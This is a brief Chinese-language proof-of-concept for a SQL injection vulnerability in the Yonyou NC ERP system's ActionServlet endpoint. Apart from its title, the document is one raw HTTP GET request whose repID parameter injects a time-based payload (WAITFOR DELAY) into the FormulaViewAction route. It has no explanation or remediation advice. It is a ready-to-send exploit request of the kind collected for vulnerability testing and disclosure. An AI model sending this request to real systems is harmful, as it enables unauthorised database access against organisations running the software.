## 用友NC-ActionServlet存在SQL注入漏洞


## poc
```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1')%20WAITFOR%20DELAY%20'0:0:5'--+&unitID=public HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
SOAPAction: http://tempuri.org/GetHomeInfo
Accept-Encoding: identity
Accept: */*
Connection: keep-alive
```
